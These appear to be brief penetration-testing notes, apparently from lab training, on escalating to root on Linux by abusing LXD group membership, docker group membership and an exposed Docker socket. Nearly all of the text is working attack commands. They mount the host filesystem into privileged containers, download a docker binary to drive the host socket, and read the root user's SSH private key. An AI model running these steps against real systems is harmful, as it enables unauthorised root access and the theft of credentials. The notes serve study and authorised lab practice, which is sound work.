# LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. 
```bash
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
```
# docker
If use in docker group, its essentially means he has root access without password required:
```bash
docker run -v /root:/mnt -it alpine
```
## docker socket
```bash
cd /tmp
wget https://master.dockerproject.org/linux/x86_64/docker
chmod +x docker
/tmp/docker -H unix:///app/docker.sock ps

htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa
```